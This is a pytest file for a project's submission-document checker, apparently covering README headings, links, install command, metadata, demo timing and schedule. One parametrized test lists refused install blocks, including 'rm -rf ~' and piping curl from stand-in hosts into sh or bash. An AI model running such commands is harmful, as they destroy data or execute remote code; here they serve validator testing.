"""Tests for the pure submission-document contract (Spec 7 task 9.3).

Requirements 7.2-7.8, 9.1-9.10, 11.6 and 12.1-12.11. The complete sample is
the repository's own document set held in memory; each case changes one thing
and names the finding it must cause. Nothing is written and no URL is followed.
"""

from __future__ import annotations

import json
import re
import sys
from pathlib import Path
from typing import Callable, Optional

import pytest

REPO_ROOT = Path(__file__).resolve().parents[2]
sys.path.insert(0, str(REPO_ROOT / "scripts" / "lib"))

import submission_contract as contract  # noqa: E402
from submission_contract import (  # noqa: E402
    ASSETS_CHECKLIST,
    ASSETS_MANIFEST,
    COVERAGE,
    CREDITS,
    DEMO,
    INSTALL_SCRIPT,
    PUBLICATION_METADATA,
    README,
    SUBMISSION_CHECKLIST,
    WRITEUP,
)

MANIFEST = "app/app.json"
READ = tuple(contract.HEADINGS) + (ASSETS_MANIFEST, PUBLICATION_METADATA, INSTALL_SCRIPT, MANIFEST)
_REAL: dict[str, Optional[str]] = {path: (REPO_ROOT / path).read_text(encoding="utf-8") for path in READ}

# The repository was published and verified on 18 Nov. These tests exercise the
# contract from before publication, so the base is the real documents turned
# back to that state: pending metadata, no public link in the README, and the
# rows that need the public site not started. The published state is checked
# against the real files in test_submission_documents.py.
_PENDING_METADATA = """{
  "schemaVersion": 1,
  "status": "pending",
  "repositoryUrl": null,
  "defaultBranch": null,
  "cloneFolder": null,
  "pagesUrl": null,
  "public": null,
  "license": "MIT"
}
"""
_UNPUBLISHED_ROWS = {
    "repository-public": "| `repository-public` | The repository is public and readable without an account | 2026-11-26 | `not_started` | Owner step: publish the repository, then record its address in `docs/publication-metadata.json` |",
    "license-detected": "| `license-detected` | GitHub detects the MIT license | 2026-11-26 | `not_started` | `LICENSE` is in place; detection is checked on the public repository |",
    "links": "| `links` | README links to the public repository and the public replay work | 2026-11-29 | `not_started` | Blocked on `repository-public`; relative links are checked by `scripts/check-submission.py` |",
    "pages-smoke": "| `pages-smoke` | The Pages workflow deployed and its smoke job passed | 2026-11-26 | `not_started` | `.github/workflows/pages.yml` is written; its first run needs the public repository |",
    "ci": "| `ci` | Normal CI is green on the default branch | 2026-11-29 | `not_started` | `.github/workflows/ci.yml`; needs the public repository |",
}


def _unpublished(files: dict[str, Optional[str]]) -> dict[str, Optional[str]]:
    readme = files[README] or ""
    readme = re.sub(r"^\*\*Open it: .*$", "The public replay link is not listed yet.", readme, flags=re.MULTILINE)
    checklist = []
    for line in (files[SUBMISSION_CHECKLIST] or "").split("\n"):
        key = re.match(r"\| `([a-z-]+)` \|", line)
        checklist.append(_UNPUBLISHED_ROWS.get(key.group(1), line) if key else line)
    return {**files, PUBLICATION_METADATA: _PENDING_METADATA, README: readme, SUBMISSION_CHECKLIST: "\n".join(checklist)}


BASE: dict[str, Optional[str]] = _unpublished(_REAL)

VERIFIED = {
    "schemaVersion": 1,
    "status": "verified",
    "repositoryUrl": "https://github.com/synthetic-owner/haunted-house",
    "defaultBranch": "main",
    "cloneFolder": "haunted-house",
    "pagesUrl": "https://synthetic-owner.github.io/haunted-house/",
    "public": True,
    "license": "MIT",
}


def real_exists(path: str) -> bool:
    return ".." not in Path(path).parts and (REPO_ROOT / path).exists()


def check(files: dict[str, Optional[str]], exists: Callable[[str], bool] = real_exists) -> list[str]:
    findings = contract.check_document_set(files, exists)
    assert all(finding.category in contract.CATEGORIES for finding in findings)
    return [str(finding) for finding in findings]


def categories(files: dict[str, Optional[str]], exists: Callable[[str], bool] = real_exists) -> set[str]:
    return {finding.category for finding in contract.check_document_set(files, exists)}


def changed(path: str, old: str, new: str, count: int = 1) -> dict[str, Optional[str]]:
    text = BASE[path]
    assert text is not None and old in text, f"{path} no longer contains {old!r}"
    return {**BASE, path: text.replace(old, new, count)}


def with_text(path: str, change: Callable[[str], str]) -> dict[str, Optional[str]]:
    text = BASE[path]
    assert text is not None
    result = change(text)
    assert result != text, "the change did nothing"
    return {**BASE, path: result}


def verified_set() -> dict[str, Optional[str]]:
    """The sample after RS-S1: metadata verified and the README linking both public URLs."""
    readme = BASE[README] or ""
    links = f"\nOpen the replay: <{VERIFIED['pagesUrl']}>. Source: <{VERIFIED['repositoryUrl']}>.\n"
    return {**BASE, PUBLICATION_METADATA: json.dumps(VERIFIED), README: readme.replace("## Live app requirements", links + "\n## Live app requirements", 1)}


# --- The complete sample -------------------------------------------------------------


def test_the_complete_document_set_is_accepted():
    assert check(BASE) == []


def test_the_complete_set_is_also_accepted_once_publication_is_verified():
    assert check(verified_set()) == []


def test_findings_name_file_line_and_category_only():
    findings = contract.check_document_set(changed(README, "## Install", "## Setup"), real_exists)
    assert findings
    for finding in findings:
        assert re.fullmatch(r"[A-Za-z0-9_./-]+:\d+: [a-z-]+(: [A-Za-z0-9 _./:+#()&,'-]*)?", str(finding)), str(finding)


# --- Required files, headings and links --------------------------------------------------


@pytest.mark.parametrize("path", contract.REQUIRED_FILES)
def test_a_missing_required_file_is_named(path: str):
    found = check({**BASE, path: None} if path in BASE else BASE, lambda candidate: candidate != path and real_exists(candidate))
    assert f"{path}:1: {contract.MISSING_FILE}" in found


@pytest.mark.parametrize(("path", "heading"), [(path, heading) for path, headings in contract.HEADINGS.items() for heading in headings])
def test_every_missing_heading_is_named(path: str, heading: str):
    files = with_text(path, lambda text: re.sub(rf"^## {re.escape(heading)}$", f"## Renamed {len(heading)}", text, count=1, flags=re.MULTILINE))
    assert f"{path}:1: {contract.MISSING_HEADING}: {heading}" in check(files)


def test_headings_inside_a_code_fence_do_not_count():
    files = changed(README, "## License", "```\n## License\n```")
    assert f"{README}:1: {contract.MISSING_HEADING}: License" in check(files)


def test_headings_out_of_order_are_refused():
    def swap(text: str) -> str:
        install = text.index("## Install")
        replay = text.index("## Static replay")
        requirements = text.index("## Live app requirements")
        # Move the Static replay section behind the Install section.
        trust = text.index("## One-time trust step")
        return text[:replay] + text[requirements:trust] + text[replay:requirements] + text[trust:] if install > replay else text

    assert contract.HEADING_ORDER in categories(with_text(README, swap))


@pytest.mark.parametrize("path", [README, WRITEUP, COVERAGE, DEMO, CREDITS, ASSETS_CHECKLIST, SUBMISSION_CHECKLIST])
def test_a_broken_relative_link_is_named_with_its_target(path: str):
    files = with_text(path, lambda text: text + "\nSee [the appendix](missing-appendix.md).\n")
    expected = "missing-appendix.md" if path == README else "docs/missing-appendix.md"
    assert any(line.endswith(f"{contract.BROKEN_LINK}: {expected}") and line.startswith(path) for line in check(files))


def test_a_link_out_of_the_repository_is_refused():
    files = with_text(WRITEUP, lambda text: text + "\n[notes](../../outside/notes.md)\n")
    assert contract.LINK_ESCAPES in categories(files)


def test_web_links_and_anchors_are_not_followed():
    files = with_text(WRITEUP, lambda text: text + "\n[docs](https://kiro.dev/docs/crew/) and [top](#problem) and [mail](mailto:nobody@invalid)\n")
    assert check(files) == []


@pytest.mark.parametrize("document", contract.DOCUMENTS[1:] + (contract.LICENSE,))
def test_the_readme_must_link_every_document(document: str):
    files = with_text(README, lambda text: text.replace(f"]({document})", f"](#{document.replace('/', '-')})"))
    assert f"{README}:1: {contract.MISSING_DOCUMENT_LINK}: {document}" in check(files)


@pytest.mark.parametrize(
    "text",
    ["TODO: add link", "see https://example.com/replay", "clone <owner>/<repo>", "your-username/haunted-house", "TBD"],
)
def test_placeholders_are_refused(text: str):
    assert contract.PLACEHOLDER in categories(with_text(WRITEUP, lambda body: body + f"\n{text}\n"))


@pytest.mark.parametrize("text", ["/" + "Users/someone/project", "/" + "home/someone/project", "C:" + "\\Users\\someone", "file" + "://local/readme"])
def test_local_absolute_paths_are_refused(text: str):
    assert contract.LOCAL_PATH in categories(with_text(CREDITS, lambda body: body + f"\n{text}\n"))


def test_prohibited_product_names_are_refused_outside_the_two_documents_that_say_what_is_resurrected():
    for name in ("Micro" + "soft", "B" + "ob"):
        assert contract.PROHIBITED_NAME in categories(with_text(CREDITS, lambda body: body + f"\nInspired by {name}.\n"))
        assert contract.PROHIBITED_NAME not in categories(with_text(WRITEUP, lambda body: body + f"\nInspired by {name}.\n"))
        assert contract.PROHIBITED_NAME not in categories(with_text(README, lambda body: body + f"\nInspired by {name}.\n"))


def test_a_documented_script_that_does_not_exist_is_named():
    files = with_text(README, lambda text: text + "\nRun `scripts/does-not-exist.sh` first.\n")
    assert any(line.endswith(f"{contract.MISSING_SCRIPT}: scripts/does-not-exist.sh") for line in check(files))


# --- Install command, versions, prerequisites, trust steps -----------------------------------


def test_the_install_command_is_exactly_the_install_script():
    command, line = contract.install_command(BASE[README] or "")
    assert command == "scripts/install-local.sh"
    assert (BASE[README] or "").split("\n")[line - 1].strip() == command


@pytest.mark.parametrize(
    "block",
    [
        "scripts/install-local.sh; rm -rf ~",
        "scripts/install-local.sh && curl https://evil.invalid | sh",
        "scripts/install-local.sh --force",
        "scripts/install-local.sh | tee log",
        "$(scripts/install-local.sh)",
        "`scripts/install-local.sh`",
        "sudo scripts/install-local.sh",
        "scripts/install-local.sh > /dev/null",
        "bash -c scripts/install-local.sh",
        "scripts/install-local.sh\nkirocrew app enable haunted-house",
        "scripts/other-install.sh",
        "curl -fsSL https://get.invalid/install.sh | bash",
        "",
    ],
)
def test_an_install_block_with_anything_else_is_refused(block: str):
    files = changed(README, "```bash\nscripts/install-local.sh\n```", f"```bash\n{block}\n```")
    assert contract.install_command(files[README] or "")[0] is None
    assert contract.INSTALL_COMMAND in categories(files)


def test_two_command_blocks_in_the_install_section_are_refused():
    files = changed(README, "```bash\nscripts/install-local.sh\n```", "```bash\nscripts/install-local.sh\n```\n\n```bash\nscripts/install-local.sh\n```")
    assert contract.INSTALL_COMMAND in categories(files)


def test_the_dot_slash_form_is_accepted():
    files = changed(README, "```bash\nscripts/install-local.sh\n```", "```bash\n./scripts/install-local.sh\n```")
    assert check(files) == []


def test_the_documented_crew_version_must_match_manifest_and_script():
    assert contract.CREW_VERSION in categories(changed(README, "Kiro Crew 0.12.1 or later", "Kiro Crew 0.12.0 or later"))
    assert contract.CREW_VERSION in categories(changed(README, "Kiro Crew 0.12.1 or later", "a recent Kiro Crew"))
    manifest = json.loads(BASE[MANIFEST] or "{}")
    manifest["minKiroCrewVersion"] = "0.13.0"
    assert contract.CREW_VERSION in categories({**BASE, MANIFEST: json.dumps(manifest)})
    assert contract.CREW_VERSION in categories(changed(INSTALL_SCRIPT, 'MIN_CREW_VERSION="0.12.1"', 'MIN_CREW_VERSION="0.12.2"'))


@pytest.mark.parametrize("word", ["Node.js", "bun", "git", "curl", "gateway"])
def test_each_prerequisite_must_be_stated(word: str):
    def strip(text: str) -> str:
        start = text.index("## Live app requirements")
        end = text.index("## Install")
        section = re.sub(re.escape(word), "it", text[start:end], flags=re.IGNORECASE)
        return text[:start] + section.replace("## Live app requirements", "## Live app requirements", 1) + text[end:]

    assert f"{contract.MISSING_PREREQUISITE}: {word}" in "\n".join(check(with_text(README, strip)))


@pytest.mark.parametrize("word", ["Library", "Enable", "Trust"])
def test_the_trust_steps_must_name_each_step_in_order(word: str):
    def strip(text: str) -> str:
        start = text.index("## One-time trust step")
        end = text.index("## Permissions")
        return text[:start] + text[start:end].replace(word, "that") + text[end:]

    assert contract.TRUST_STEPS in categories(with_text(README, strip))


def test_the_static_replay_must_be_called_read_only():
    files = with_text(README, lambda text: text.replace("read-only", "view only"))
    assert f"{contract.MISSING_PHRASE}: read-only" in "\n".join(check(files))


def test_the_readme_must_list_every_api_permission():
    files = changed(README, "`/api/version`", "the version route")
    assert contract.MISSING_PHRASE in categories(files)


@pytest.mark.parametrize("name", ["Spec Builder", "Agent Worlds"])
@pytest.mark.parametrize("path", [README, WRITEUP, CREDITS])
def test_related_work_is_credited_by_name(path: str, name: str):
    files = with_text(path, lambda text: text.replace(name, "a built-in app"))
    assert f"{contract.MISSING_PHRASE}: {name}" in "\n".join(check(files))


# --- Publication metadata (RS-S1) ------------------------------------------------------------------


@pytest.mark.parametrize(
    "change",
    [
        lambda m: m.update(status="ready"),
        lambda m: m.update(schemaVersion=2),
        lambda m: m.update(license="Apache-2.0"),
        lambda m: m.update(repositoryUrl="http://github.com/synthetic-owner/haunted-house"),
        lambda m: m.update(repositoryUrl="https://github.com/synthetic-owner/haunted-house?token=abc"),
        lambda m: m.update(repositoryUrl="https://gitlab.com/synthetic-owner/haunted-house"),
        lambda m: m.update(cloneFolder="other-folder"),
        lambda m: m.update(pagesUrl="http://synthetic-owner.github.io/haunted-house/"),
        lambda m: m.update(pagesUrl="https://synthetic-owner.github.io/haunted-house/?x=1"),
        lambda m: m.update(public=False),
        lambda m: m.update(defaultBranch=None),
        lambda m: m.update(token="abc"),
        lambda m: m.pop("license"),
        lambda m: m.update(repositoryUrl="https://github.com/your-username/haunted-house", cloneFolder="haunted-house"),
    ],
)
def test_verified_metadata_must_have_the_exact_bounded_shape(change: Callable[[dict], None]):
    metadata = dict(VERIFIED)
    change(metadata)
    assert contract.check_metadata(metadata) != []


def test_pending_metadata_holds_no_url():
    pending = json.loads(BASE[PUBLICATION_METADATA] or "{}")
    assert pending["status"] == "pending"
    assert contract.check_metadata(pending) == []
    assert contract.check_metadata({**pending, "repositoryUrl": VERIFIED["repositoryUrl"]}) != []
    assert contract.check_metadata({**pending, "public": True}) != []
    for broken in (None, [], "pending", {}):
        assert contract.check_metadata(broken) != []
    assert contract.METADATA_INVALID in categories({**BASE, PUBLICATION_METADATA: "{not json"})


@pytest.mark.parametrize("path", [README, WRITEUP, DEMO, SUBMISSION_CHECKLIST])
@pytest.mark.parametrize(
    "url",
    ["https://github.com/someone/haunted-house", "https://someone.github.io/haunted-house/", "https://raw.githubusercontent.com/someone/x/main/a.png"],
)
def test_no_repository_or_pages_url_may_appear_before_it_is_verified(path: str, url: str):
    files = with_text(path, lambda text: text + f"\nSee {url} for more.\n")
    assert contract.UNVERIFIED_URL in categories(files)


def test_after_verification_only_the_verified_urls_are_allowed_and_the_readme_must_link_them():
    files = verified_set()
    other = {**files, README: (files[README] or "") + "\nMirror: https://github.com/another-owner/haunted-house\n"}
    assert contract.UNVERIFIED_URL in categories(other)
    unlinked = {**BASE, PUBLICATION_METADATA: json.dumps(VERIFIED)}
    assert contract.MISSING_PUBLIC_LINK in categories(unlinked)
    deeper = {**files, WRITEUP: (files[WRITEUP] or "") + f"\nWorkflow: {VERIFIED['repositoryUrl']}/actions\n"}
    assert check(deeper) == []


# --- Kiro Coverage Table -----------------------------------------------------------------------------


@pytest.mark.parametrize("column", contract.COVERAGE_COLUMNS)
def test_every_coverage_column_is_required(column: str):
    files = changed(COVERAGE, f"| {column} |", f"| Other {len(column)} |")
    assert f"{contract.TABLE_COLUMNS}: {column}" in "\n".join(check(files))


def test_the_coverage_table_must_exist_and_have_rows():
    def drop_rows(text: str) -> str:
        return "\n".join(line for line in text.split("\n") if not line.startswith("| ") or line.startswith("| Feature"))

    assert contract.TABLE_ROW in categories(with_text(COVERAGE, drop_rows))
    assert contract.TABLE_MISSING in categories(with_text(COVERAGE, lambda text: "\n".join(line for line in text.split("\n") if not line.startswith("|"))))


def test_coverage_rows_need_valid_scope_completion_and_existing_evidence():
    assert contract.INVALID_STATUS in categories(changed(COVERAGE, "| MVP | Complete |", "| Core | Complete |"))
    assert contract.INVALID_STATUS in categories(changed(COVERAGE, "| MVP | Complete |", "| MVP | Done |"))
    missing = changed(COVERAGE, "`app/ui/src/core/replay-reducer.ts`", "`app/ui/src/core/replay-missing.ts`")
    assert any(line.endswith(f"{contract.EVIDENCE_NOT_FOUND}: app/ui/src/core/replay-missing.ts") for line in check(missing))


def test_a_complete_coverage_row_needs_implementation_and_test_evidence():
    def claim(text: str) -> str:
        return text.replace("| Not built | Not built | Not in the demo | Stretch | Not started |", "| Not built | Not built | Not in the demo | Stretch | Complete |")

    assert contract.EVIDENCE_MISSING in categories(with_text(COVERAGE, claim))


# --- Demo script -------------------------------------------------------------------------------------------


def demo(*beats: tuple[str, str]) -> dict[str, Optional[str]]:
    body = "\n\n".join(f"### {marker} Beat\n\n**Action:** {text}\n\n**Expect:** it shows." for marker, text in beats)
    return {**BASE, DEMO: f"# Demo\n\n## Before recording\n\nReady.\n\n## Script\n\n{body}\n\n## Fallbacks\n\nNone.\n"}


ALL_BEATS = "static replay, live app, approval, Workshop, Attic"


def test_the_real_demo_script_is_165_seconds():
    beats, problems = contract.demo_beats(BASE[DEMO] or "")
    assert problems == []
    assert [(begin, end) for _line, begin, end, _body in beats] == [(0, 15), (15, 35), (35, 65), (65, 90), (90, 135), (135, 155), (155, 165)]


def test_179_seconds_is_accepted_and_180_is_refused():
    assert check(demo(("0:00–1:00", ALL_BEATS), ("1:00–2:59", "close"))) == []
    refused = check(demo(("0:00–1:00", ALL_BEATS), ("1:00–3:00", "close")))
    assert any(line.endswith(f"{contract.DEMO_DURATION}: 180 seconds") for line in refused)
    assert contract.DEMO_DURATION in categories(demo(("0:00–1:00", ALL_BEATS), ("1:00–4:10", "close")))


@pytest.mark.parametrize(
    "markers",
    [
        ("0:10–0:30", "0:30–1:00"),  # does not start at zero
        ("0:00–0:30", "0:40–1:00"),  # gap
        ("0:00–0:30", "0:20–1:00"),  # overlap
        ("0:00–0:30", "0:30–0:30"),  # empty beat
        ("0:00–0:40", "0:40–0:20"),  # decreasing
        ("0:30–1:00", "0:00–0:30"),  # out of order
    ],
)
def test_markers_must_be_contiguous_and_increasing(markers: tuple[str, str]):
    assert contract.DEMO_ORDER in categories(demo((markers[0], ALL_BEATS), (markers[1], "close")))


@pytest.mark.parametrize("marker", ["0:00 to 0:30", "00–30", "0:0–0:30", "0:00–0:75", "first", "0:00–", "–0:30"])
def test_malformed_markers_are_refused(marker: str):
    assert contract.DEMO_MARKER in categories(demo((marker, ALL_BEATS)))


def test_a_script_without_markers_is_refused():
    assert contract.DEMO_MARKER in categories({**BASE, DEMO: "# Demo\n\n## Before recording\n\n## Script\n\nJust talk.\n\n## Fallbacks\n"})


def test_a_hyphen_is_accepted_as_the_range_separator():
    assert check(demo(("0:00-1:00", ALL_BEATS), ("1:00-2:00", "close"))) == []


@pytest.mark.parametrize("beat", ["static replay", "live", "approval", "Workshop", "Attic"])
def test_every_required_beat_must_be_present(beat: str):
    remaining = ", ".join(part for part in ("static replay", "live app", "approval", "Workshop", "Attic") if not part.startswith(beat))
    if beat == "live":
        remaining = remaining.replace("static replay", "static replay")
    found = categories(demo(("0:00–1:00", remaining), ("1:00–2:00", "close")))
    assert contract.DEMO_BEAT in found


@pytest.mark.parametrize("label", ["**Action:**", "**Expect:**"])
def test_every_beat_needs_an_action_and_an_expected_result(label: str):
    files = with_text(DEMO, lambda text: text.replace(label, label.replace(":", ""), 1))
    assert contract.DEMO_BEAT in categories(files)


# --- Asset checklist and credits ----------------------------------------------------------------------------


@pytest.mark.parametrize("key", contract.ASSET_KEYS)
def test_every_asset_row_is_required(key: str):
    files = with_text(ASSETS_CHECKLIST, lambda text: "\n".join(line for line in text.split("\n") if not line.startswith(f"| `{key}` |")))
    found = check(files)
    assert f"{contract.MISSING_KEY}: {key}" in "\n".join(found)


@pytest.mark.parametrize("column", contract.ASSET_COLUMNS)
def test_every_asset_column_is_required(column: str):
    files = changed(ASSETS_CHECKLIST, f"| {column} |", "| Other |")
    assert contract.TABLE_COLUMNS in categories(files)


def test_a_screenshot_cannot_be_marked_complete_without_its_file_and_provenance():
    files = changed(ASSETS_CHECKLIST, "light | Light theme: the Haunted House cutaway map with its rooms, doors and ghosts, each showing its state as text and an icon. | Original | `pending` |", "light | Light theme: the Haunted House cutaway map with its rooms, doors and ghosts, each showing its state as text and an icon. | Original | `complete` |")
    assert contract.ASSET_ROW in categories(files)
    # The file alone is not enough: the provenance record must exist too.
    assert contract.ASSET_ROW in categories(files, lambda path: path == "docs/screenshots/house-light.png" or real_exists(path))


def test_a_file_or_record_without_a_complete_row_is_refused():
    assert contract.ASSET_ROW in categories(BASE, lambda path: path == "docs/screenshots/house-dark.png" or real_exists(path))
    manifest = json.loads(BASE[ASSETS_MANIFEST] or "{}")
    manifest["assets"].append({**manifest["assets"][0], "path": "docs/screenshots/extra.png"})
    assert contract.ASSET_ROW in categories({**BASE, ASSETS_MANIFEST: json.dumps(manifest)})


def test_a_captured_screenshot_with_provenance_and_credit_is_accepted():
    path = "docs/screenshots/house-light.png"
    manifest = json.loads(BASE[ASSETS_MANIFEST] or "{}")
    manifest["assets"].append({**manifest["assets"][0], "path": path, "kind": "screenshot"})
    checklist = (BASE[ASSETS_CHECKLIST] or "").replace("each showing its state as text and an icon. | Original | `pending` |", "each showing its state as text and an icon. | Original | `complete` |", 1)
    credits = (BASE[CREDITS] or "").replace("\n\nThe house, rooms", f"\n| `{path}` | Screenshot | Haunted House contributors | Original | Capture of this interface |\n\nThe house, rooms", 1)
    files = {**BASE, ASSETS_MANIFEST: json.dumps(manifest), ASSETS_CHECKLIST: checklist, CREDITS: credits}
    assert check(files, lambda candidate: candidate == path or real_exists(candidate)) == []
    # Without the credit row the asset is uncredited.
    assert contract.UNCREDITED_ASSET in categories({**files, CREDITS: BASE[CREDITS]}, lambda candidate: candidate == path or real_exists(candidate))


@pytest.mark.parametrize(
    ("old", "new"),
    [("| 256 × 256 |", "| large |"), ("| n/a | A small amber", "| sepia | A small amber"), ("| Original | `complete` |", "| Unknown | `complete` |"), ("| Original | `not_planned` |", "| Original | `later` |")],
)
def test_asset_rows_need_dimensions_theme_provenance_and_status(old: str, new: str):
    assert categories(changed(ASSETS_CHECKLIST, old, new)) & {contract.TABLE_ROW, contract.INVALID_STATUS}


def test_alt_text_is_required():
    files = with_text(ASSETS_CHECKLIST, lambda text: re.sub(r"\| A small amber house[^|]*\|", "| icon |", text))
    assert f"{contract.TABLE_ROW}: Alt text" in "\n".join(check(files))


def test_every_manifest_asset_must_be_credited_with_its_license():
    assert contract.UNCREDITED_ASSET in categories(changed(CREDITS, "`app/assets/icon.png`", "the icon"))
    assert contract.UNCREDITED_ASSET in categories(changed(CREDITS, "| Haunted House contributors | Original |", "| Haunted House contributors | ours |"))
    manifest = json.loads(BASE[ASSETS_MANIFEST] or "{}")
    manifest["assets"][0].update(provenance="cc0", licenseName="CC0-1.0", sourceUrl="https://art.invalid/icon", licenseUrl="https://creativecommons.org/publicdomain/zero/1.0/")
    assert contract.UNCREDITED_ASSET in categories({**BASE, ASSETS_MANIFEST: json.dumps(manifest)})


# --- Submission checklist and schedule -------------------------------------------------------------------------


@pytest.mark.parametrize("key", contract.CHECKLIST_KEYS)
def test_every_checklist_key_is_required(key: str):
    def drop(text: str) -> str:
        start = text.index("## Checklist")
        end = text.index("## Feature freeze rule")
        kept = "\n".join(line for line in text[start:end].split("\n") if not line.startswith(f"| `{key}` |"))
        return text[:start] + kept + text[end:]

    assert f"{contract.MISSING_KEY}: {key}" in "\n".join(check(with_text(SUBMISSION_CHECKLIST, drop)))


def test_a_duplicate_checklist_key_is_refused():
    files = with_text(SUBMISSION_CHECKLIST, lambda text: text.replace("| `video` | Demo video", "| `tests` | Demo video", 1))
    assert {contract.DUPLICATE_KEY, contract.MISSING_KEY} <= categories(files)


def test_complete_needs_evidence_that_exists():
    row = "| `credits` | Every distributed asset is credited and reviewed by a person | 2026-12-01 | `in_progress` | `docs/credits.md`, `docs/assets-manifest.json` |"
    assert check(changed(SUBMISSION_CHECKLIST, row, row.replace("in_progress", "complete"))) == []
    without = row.replace("in_progress", "complete").replace("`docs/credits.md`, `docs/assets-manifest.json`", "it passed")
    assert contract.EVIDENCE_MISSING in categories(changed(SUBMISSION_CHECKLIST, row, without))
    absent = row.replace("`docs/credits.md`", "`docs/evidence/credit-review.txt`")
    assert contract.EVIDENCE_NOT_FOUND in categories(changed(SUBMISSION_CHECKLIST, row, absent))


def test_element_names_keep_letters_of_any_script():
    files = with_text(COVERAGE, lambda text: text.replace("| MVP | Complete |", "| MVP | Pending |", 1))
    pending = "\n".join(str(finding) for finding in contract.check_release_ready(BASE))
    assert "Séance log and ghost states" in pending
    assert files[COVERAGE] != BASE[COVERAGE]


@pytest.mark.parametrize("key", sorted(contract.PUBLIC_KEYS))
def test_public_rows_cannot_be_complete_before_publication_is_verified(key: str):
    def claim(text: str) -> str:
        lines = text.split("\n")
        index = next(i for i, line in enumerate(lines) if line.startswith(f"| `{key}` |"))
        cells = lines[index].split("|")
        cells[4] = " `complete` "
        cells[5] = " `README.md` "
        lines[index] = "|".join(cells)
        return "\n".join(lines)

    assert contract.UNVERIFIED_URL in categories(with_text(SUBMISSION_CHECKLIST, claim))
    files = verified_set()
    files[SUBMISSION_CHECKLIST] = claim(files[SUBMISSION_CHECKLIST] or "")
    assert check(files) == []


def test_statuses_and_due_dates_are_checked():
    assert contract.INVALID_STATUS in categories(changed(SUBMISSION_CHECKLIST, "| 2026-12-02 | `not_started` | `docs/demo-script.md` |", "| 2026-12-02 | `done` | `docs/demo-script.md` |"))
    assert contract.MILESTONE_DATE in categories(changed(SUBMISSION_CHECKLIST, "| 2026-12-02 | `not_started` | `docs/demo-script.md` |", "| 2026-12-09 | `not_started` | `docs/demo-script.md` |"))


@pytest.mark.parametrize(("date", "key"), contract.MILESTONES)
def test_every_milestone_has_its_exact_date(date: str, key: str):
    moved = "2026-11-16" if not date.startswith("2026-11-16") else "2026-11-17"
    files = changed(SUBMISSION_CHECKLIST, f"| {date} | `{key}` |", f"| {moved} | `{key}` |")
    assert f"{contract.MILESTONE_DATE}: {key}" in "\n".join(check(files))
    gone = with_text(SUBMISSION_CHECKLIST, lambda text: "\n".join(line for line in text.split("\n") if f"| `{key}` |" not in line))
    assert f"{contract.MILESTONE_DATE}: {key}" in "\n".join(check(gone))


def test_the_schedule_records_the_requirement_12_dates():
    assert dict((key, date) for date, key in contract.MILESTONES) == {
        "planning": "2026-11-15",
        "replay-engine": "2026-11-22",
        "attic-and-pages-candidate": "2026-11-26",
        "permission-freeze-and-rehearsal": "2026-11-29",
        "feature-freeze": "2026-11-30",
        "media-and-checklist-close": "2026-12-01",
        "video": "2026-12-02",
        "submission": "2026-12-03",
        "deadline": "2026-12-04 14:00 PT",
    }


def schedule(rows: list[str]) -> dict[str, Optional[str]]:
    def replace(text: str) -> str:
        start = text.index("## Schedule")
        end = text.index("## Checklist")
        header = "## Schedule\n\n| Date | ID | Gate | Scope | Status |\n|---|---|---|---|---|\n"
        return text[:start] + header + "\n".join(rows) + "\n\n" + text[end:]

    return with_text(SUBMISSION_CHECKLIST, replace)


def mvp_rows(status: str = "not_started", **dates: str) -> list[str]:
    return [f"| {dates.get(key.replace('-', '_'), date)} | `{key}` | Gate | MVP | `{status}` |" for date, key in contract.MILESTONES]


STRETCH = "| after MVP rehearsal | `stretch-polish` | Polish | Stretch | `not_started` |"


def test_a_minimal_valid_schedule_is_accepted():
    assert check(schedule(mvp_rows() + [STRETCH])) == []


def test_submission_must_come_before_the_deadline():
    late = schedule(mvp_rows(submission="2026-12-04", deadline="2026-12-04 14:00 PT"))
    assert {contract.MILESTONE_ORDER, contract.MILESTONE_DATE} <= categories(late)
    after = schedule(mvp_rows(submission="2026-12-05"))
    assert contract.MILESTONE_ORDER in categories(after)


def test_mvp_gates_must_be_in_date_order():
    rows = mvp_rows()
    rows[1], rows[2] = rows[2], rows[1]
    assert contract.MILESTONE_ORDER in categories(schedule(rows))


@pytest.mark.parametrize(
    "rows",
    [
        [STRETCH] + mvp_rows(),  # stretch listed before MVP
        mvp_rows()[:4] + [STRETCH] + mvp_rows()[4:],  # stretch between MVP gates
        mvp_rows() + [STRETCH.replace("after MVP rehearsal", "2026-11-28")],  # stretch given a date
        mvp_rows() + [STRETCH.replace("not_started", "in_progress")],  # stretch started while MVP is open
        mvp_rows() + [STRETCH.replace("not_started", "complete")],
    ],
)
def test_stretch_before_mvp_is_refused(rows: list[str]):
    assert contract.STRETCH_BEFORE_MVP in categories(schedule(rows))


def test_stretch_may_start_once_every_mvp_gate_is_complete():
    assert check(schedule(mvp_rows("complete") + [STRETCH.replace("not_started", "in_progress")])) == []


@pytest.mark.parametrize("column", contract.SCHEDULE_COLUMNS)
def test_every_schedule_column_is_required(column: str):
    files = changed(SUBMISSION_CHECKLIST, f"| {column} |", "| Other |")
    assert contract.TABLE_COLUMNS in categories(files)


# --- Release readiness ----------------------------------------------------------------------------------------------


def test_the_release_check_lists_everything_still_pending():
    pending = contract.check_release_ready(BASE)
    assert pending and all(finding.category == contract.RELEASE_PENDING for finding in pending)
    text = "\n".join(str(finding) for finding in pending)
    assert f"{PUBLICATION_METADATA}:1" in text
    for key in ("repository-public", "screenshots", "video", "submission", "house-light"):
        assert key in text
    # The optional hero image is a recorded decision, not a blocker.
    assert "hero-light" not in text


def test_nothing_is_pending_only_when_every_row_is_complete_and_publication_is_verified():
    files = verified_set()
    files[SUBMISSION_CHECKLIST] = re.sub(r"`(?:not_started|in_progress|pending|blocked)`", "`complete`", files[SUBMISSION_CHECKLIST] or "")
    files[ASSETS_CHECKLIST] = (files[ASSETS_CHECKLIST] or "").replace("`pending`", "`complete`")
    files[COVERAGE] = re.sub(r"\| MVP \| [^|]+ \|", "| MVP | Complete |", files[COVERAGE] or "")
    assert contract.check_release_ready(files) == ()
    assert contract.check_release_ready({**files, PUBLICATION_METADATA: BASE[PUBLICATION_METADATA]}) != ()
